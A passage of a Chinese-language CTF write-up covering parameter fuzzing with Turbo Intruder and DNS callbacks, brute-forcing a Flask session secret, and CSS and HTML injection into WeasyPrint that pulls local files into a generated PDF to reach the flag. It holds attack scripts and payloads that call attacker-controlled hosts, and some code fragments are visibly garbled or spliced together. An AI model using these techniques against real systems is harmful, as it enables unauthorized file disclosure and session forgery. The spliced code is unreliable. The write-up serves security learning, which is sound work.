    Host: 104.196.12.98
    Cookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0
Python:
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                               concurrentConnections=20,
                               requestsPerConnection=40,
                               pipeline=False
                               )
    ...            
        for word in open('C:\\wordlists\\backslash-powered-scanner-params.txt'):
            engine.queue(target.req, word.strip() + '=turbo.d.mydomain.com.br')
    ... 
    def handleResponse(req, interesting):
        table.add(req)
请主意，我仅仅把要爆破的参数值设置为`turbo.d.mydomain.com.br`，如果它被解析的话就会记录在我的dns日志里。在此之后，我只是按status
code对结果进行排序，结果显示参数名为`port`的响应码为500。很好，我们现在能够设置`port`参数的值。接下来的想法是尝试将端口更改为0-65535中的所有值并检测另一个服务。使用Turbo
Intruder很容易：
    ...
        for x in range(0,65536):
            engine.queue(target.req, x)
但没有什么不同。让我们试试一些注入，设置`port`值为`PI:EMAIL:80`会变成`http://update.flitethermostat:PI:EMAIL:80/`从而实现了对`myserver.com`的SSRF。但它并没有发生，服务器返回错误500.端口是一个整数参数。休息一下......
##### JWT
登录后，会分配一个cookie，显然是flask JWT。 jwt.io的定义：`JSON Web Token (JWT) 是一个开放标准（RFC
7519），它定义了一种紧凑且独立的方式，用于在各方之间作为JSON对象安全地传输信息。信息能够被校验和信任，因为它被数字签名了`。它也说`JSON Web
Tokens由三部分组成以点(.)分割，它们是：Header.Payload.Signature ....这个json是被Base64Url编码的....`  
Base64解码第一部分：
    # session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0
    # eyJsb2dnZWRJbiI6dHJ1ZX0
    # echo -n 'eyJsb2dnZWRJbiI6dHJ1ZX0='  | base64 -d
    {"loggedIn":true}
只有一个`loggedIn`属性...不过我决定扩展`https://github.com/noraj/flask-session-cookie-manager`它的功能，并且为`app.secret_key`创建一个爆破功能，在一个flask应用中`app.secret_key`被用来为JWT签名。
    ...
    parser_brute = subparsers.add_parser('brute', help='brute')
    parser_brute.add_argument('-p', '--payload', metavar='',
                                help='Cookie value', required=True)
    parser_brute.add_argument('-w', '--wordlist', metavar='',
                                help='Wordlist', required=True)
    ...
    def bruteforce(payl, wordl):   
        f = open(wordl, 'r')
        for line in f:
            s = session_cookie_decoder(payl,line.strip())
            print(line.strip() +'  '+ s)
            if 'error' not in s:
                print(line.strip + ' \&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });
            $('#iframe-box').empty();
            $('#iframe-box').append($(''));
    }
    function savePDF() {
            var p = encodeInvoice();
            var url = 'http://' + window.location.hostname + '/invoices/pdfize?d=' + encodeURIComponent(p);
            url = url.replace(/[\u00A0-\u9999<>\&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });
            var a = $('If your download does not start, click here');
            $('#iframe-box').append(a);
            a.find('span').trigger('click');
    }
使用`/invoice/preview`我们得到一个带有我们发票的html页面，并使用`/invoice/pdfize`我们得到一个内容相同的PDF文档。分析其余的代码我能够使用curl向两个端点发送有效请求：
    curl -gv 'http://localhost:81/invoices/preview?d={"companyName":"Hackerone","email":"PI:EMAIL","invoiceNumber":"1","date":"2019-03-08","items":[["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"]],"styles":{"body":{"background-color":"white"}}}'; echo;
    curl -gv 'http://localhost:81/invoices/pdfize?d={"companyName":"Hackerone","email":"PI:EMAIL","invoiceNumber":"1","date":"2019-03-08","items":[["1","manoelt","manoelt","22222","2"],["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"]],"styles":{"body":{"background-color":"white"}}}' -o invoice.pdf; echo;
攻击python
Web应用程序时我尝试的第一件事就是服务器端模板注入。虽然我们在json上面有几个输入选项，但是使用`{{7*7}}`作为payload，没有一个响应内容证明有SSTI漏洞。另外，引起我们注意的是允许为网页定义样式，因为我们已经知道可以使用css，那么我们可以利用它泄漏网页的信息，但它似乎没有用处。但是如果我们能够使用`url()`触发HTTP请求，我们可以获得更多的侦察信息：
    ..."styles":{"body":{"background-image":"url('http://myserver.com.br/')"....
我在我的服务器上收到了带有这个请求头的请求：`User-Agent: WeasyPrint 44 (http://weasyprint.org/)`。
#### WeasyPrint
什么是WeasyPrint？从：WeasyPrint是一个智能解决方案，用来帮助Web开发人员创建PDF文档。它将简单的HTML页面变成华丽的统计报告，发票，票据......好的，是时候更多的了解这个python库了。
阅读文档我看到了这个：与不受信任的HTML或不受信任的CSS一起使用时，WeasyPrint也许会遇到安全问题。您需要在Python应用程序中进行额外配置以避免占用大量内存，无休止的渲染或者本地文件泄漏....太好了！我们现在需要知道的是如何利用这个漏洞。也许有人在github上提出了一个`issue`？事实并非如此。但是，我发现了这个`pull
request`：  
“添加了对PDF附件的支持。”()  
多么神奇的功能！因此，使用``WeasyPrint会把herf指定的文件附加到PDF。我相信这就是我们所需要的。  
让我们测试所有json属性来注入HTML代码。没有什么比创建一个python脚本来帮助我们更好的了：
    ...
    URL = 'http://localhost:81/invoices/'
    ...
    def pdfize(payl, filename):
        r = requests.get(URL+PDFIZE, params=payload)
        with open('invoices/'+filename, 'wb') as fd:
            for chunk in r.iter_content(chunk_size=128):
                fd.write(chunk)
    def preview(payl):
        r = requests.get(URL+PREVIEW, params=payload)
        print(r.content)
    invoice = {"companyName":"", "items":[["1","manoelt`，...而这个提示来自`你可以使用//代替闭合标签>`。做了最后的exploit：
    invoice = {"companyName":"", "email":"", "invoiceNumber":"1", "date":"html", "", "items":[["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"]],"styles":{"body":{"} body: {  background-color":"white"}}}
    payload = {"d" : json.dumps(invoice)}
    pdfize(payload, "style_invoice.pdf")
最后我打开PDF，那里面有：  
[](./img/8025008296798609211.png
"pdf")  
`如果你正在阅读这篇文章，你已经完成了CTF,到达了路的终点`  
这是FLAG：c8889970d9fb722066f31e804e351993  
查看其他玩家的其他[报告](https://github.com/manoelt/50M_CTF_Writeup/blob/master/Others.md
"报告")